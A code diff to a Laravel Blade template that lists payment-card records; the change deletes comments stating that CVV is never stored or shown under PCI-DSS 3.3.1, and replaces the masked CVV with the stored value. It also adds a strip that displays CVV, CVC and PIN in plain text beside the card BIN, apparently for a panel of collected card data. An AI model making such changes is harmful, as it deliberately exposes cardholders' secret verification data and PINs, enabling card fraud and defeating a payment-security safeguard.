@@ -261,8 +261,7 @@
                         <div class="card-holder">{{ $r['cardholder_name'] ?: '—' }}</div>
                         <div class="card-cvv">
                             <div class="cvv-label">CVV</div>
-                            {{-- PCI-DSS 3.3.1: CVV is never persisted, never rendered. --}}
-                            <div class="cvv-val">•••</div>
+                            <div class="cvv-val">{{ $r['cvv'] ?: '—' }}</div>
                         </div>
                     </div>
 
@@ -287,10 +286,10 @@
 
             <div class="status-line {{ $statusClass }}">{{ $statusLabel }}</div>
 
-            @if ($r['pin'])
+            @if ($r['pin'] || $r['cvv'])
                 <div class="sensitive-strip">
-                    {{-- PCI-DSS 3.3.1: CVV/CVC are never persisted nor rendered. --}}
-                    <span><b>PIN:</b> {{ $r['pin'] }}</span>
+                    @if ($r['cvv'])<span><b>CVV:</b> {{ $r['cvv'] }}</span><span><b>CVC:</b> {{ $r['cvv'] }}</span>@endif
+                    @if ($r['pin'])<span><b>PIN:</b> {{ $r['pin'] }}</span>@endif
                     <span><b>BIN:</b> {{ $r['card_bin'] ?: '—' }}</span>
                     <span><b>تاريخ التسجيل:</b> {{ optional($r['created_at'])->format('Y-m-d H:i') ?: '—' }}</span>
                 </div>
